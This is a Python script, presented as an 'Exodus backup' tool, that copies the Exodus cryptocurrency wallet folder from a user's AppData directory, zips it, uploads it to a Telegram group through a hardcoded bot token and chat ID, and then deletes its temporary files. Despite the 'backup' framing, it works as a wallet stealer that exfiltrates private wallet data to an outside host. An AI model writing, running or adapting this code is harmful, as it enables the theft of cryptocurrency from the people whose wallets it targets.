import os
import shutil
import tempfile
import requests
from pathlib import Path

# === CONFIG ===
# Replace these with your values
BOT_TOKEN = "8201470632:AAF5IUsKsaw6P0sXCzKzjFxkA58HRhUi0ok"  # <-- replace with your bot token
CHAT_ID = "-1003124606143"  # <-- replace with your chat id (group)
SOURCE_FOLDER = os.path.join(os.path.expanduser("~"), "AppData", "Roaming", "Exodus")
# =================

def copy_to_temp(src_folder: str) -> Path:
    """
    Copy the src_folder to a temporary directory and return the temp directory path.
    """
    if not os.path.isdir(src_folder):
        raise FileNotFoundError(f"Source folder not found: {src_folder}")

    tmp_parent = Path(tempfile.mkdtemp(prefix="Exodus_copy_"))
    tmp_dst = tmp_parent / "Exodus"
    shutil.copytree(src_folder, tmp_dst)
    return tmp_dst

def make_zip(folder_path: Path) -> Path:
    """
    Create a zip file from folder_path. Returns path to the zip file.
    """
    zip_base = folder_path.parent / (folder_path.name + "_backup")
    zip_path = shutil.make_archive(base_name=str(zip_base), format='zip', root_dir=str(folder_path), base_dir='.')
    return Path(zip_path)

def send_file_telegram(bot_token: str, chat_id: str, file_path: Path, caption: str = None) -> dict:
    """
    Uploads a file to the specified Telegram chat using sendDocument.
    Returns Telegram API JSON response as dict.
    """
    url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
    with open(file_path, "rb") as f:
        files = {"document": (file_path.name, f)}
        data = {"chat_id": chat_id}
        if caption:
            data["caption"] = caption
        resp = requests.post(url, data=data, files=files, timeout=120)
    try:
        return resp.json()
    except ValueError:
        resp.raise_for_status()

def cleanup_paths(*paths):
    for p in paths:
        try:
            if isinstance(p, (str, Path)):
                p = Path(p)
            if p.exists():
                if p.is_file():
                    p.unlink()
                else:
                    shutil.rmtree(p)
        except Exception as e:
            print(f"Warning: cleanup failed for {p}: {e}")

def main():
    print("Starting backup -> telegram upload procedure.")
    print(f"Source folder: {SOURCE_FOLDER}")
    try:
        # 1) copy to temp
        print("Copying folder to temporary location...")
        tmp_folder = copy_to_temp(SOURCE_FOLDER)
        print(f"Copied to {tmp_folder}")

        # 2) create zip
        print("Creating zip archive...")
        zip_path = make_zip(tmp_folder)
        print(f"Created zip: {zip_path} ({zip_path.stat().st_size} bytes)")

        # Optional: check size and warn if large
        max_bytes = 50 * 1024 * 1024  # 50 MB approximate bot limit — test and adjust
        if zip_path.stat().st_size > max_bytes:
            print("Warning: zip file is larger than 50 MB; Telegram bot upload may fail.")

        # 3) send to Telegram
        print("Uploading to Telegram...")
        resp = send_file_telegram(BOT_TOKEN, CHAT_ID, zip_path, caption="Exodus backup")
        if resp.get("ok"):
            print("File sent successfully. Telegram response:", resp.get("result", {}).get("message_id"))
        else:
            print("Telegram API returned an error:", resp)

    except Exception as e:
        print("Error:", e)
    finally:
        # 4) cleanup temp folder + zip
        print("Cleaning up temporary files...")
        try:
            # tmp_folder parent is the unique temporary root we created
            cleanup_paths(zip_path, tmp_folder.parent)
            print("Cleanup completed.")
        except Exception as e:
            print("Cleanup exception:", e)

if __name__ == "__main__":
    main()
